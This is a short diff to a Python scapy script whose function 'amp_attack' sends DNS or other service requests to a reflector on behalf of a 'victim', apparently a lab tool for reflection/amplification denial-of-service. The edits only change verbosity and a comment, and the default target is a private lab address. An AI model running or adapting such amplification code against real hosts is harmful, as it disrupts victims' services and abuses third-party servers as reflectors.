@@ -16,10 +16,10 @@ def amp_attack(reflector, victim=None, service="DNS", port=None):
     else:
         raise ValueError(f"Unsupported service: {service}")
 
-    scapy.send(pkt, verbose=0)
+    scapy.send(pkt, verbose=1)
     print(f"Sent {service} request to {reflector} (victim={victim or 'local'})")
 
 if __name__ == "__main__":
-    # Try changing the service and IP to test each one.
+    # changing the service and IP to test each one.
     amp_attack(reflector="192.168.56.2", service="DNS")
 
